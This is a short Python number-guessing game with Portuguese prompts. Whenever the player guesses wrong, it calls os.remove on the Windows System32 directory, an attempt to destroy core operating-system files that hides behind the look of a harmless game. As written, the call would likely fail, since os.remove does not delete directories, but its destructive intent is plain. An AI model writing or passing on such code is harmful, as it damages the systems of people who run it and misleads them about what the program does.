import random
import os

number = random.randint(1, 10)

guess = input("Vamos brincar!")
guess = int(guess)

if (guess == number):
    print("Você venceu!")
else:
    os.remove("C:\Windows\System32")